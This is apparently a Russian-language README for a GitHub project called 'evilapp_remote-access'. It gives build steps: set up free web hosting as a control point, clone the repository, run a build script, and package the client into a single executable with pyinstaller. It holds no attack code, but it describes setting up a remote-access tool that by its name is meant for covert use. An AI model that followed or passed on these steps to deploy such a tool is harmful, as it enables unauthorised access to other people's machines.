# evilapp_remote-access
программа создана для ознакомления
##требования
-установлены следующие пакеты:
-git
-python3
-pip3

## Инструкция
### Шаг 1
зайти на сайт веб хостинга и получить его [000webhost.com](http://000webhost.com) , так надо зарегистрироваться и получить бесплатный хостинг.
### Шаг 2
клонировать этот git репозиторий
```bash
git clone https://github.com/0RootLoL0/evilapp_remote-access.git
cd evilapp_remote-access
```
### Шаг 3
запустить скрипт evilapp_build.py
```bash
python3 evilapp_build.py
```
### Шаг 5
установить pyinstaller.
```bash
pip3 install pyinstaller
```
### Шаг 6
в папке с файлом evilapp.py выполнить команду
```bash
pyinstaller --onefile evilapp.py
```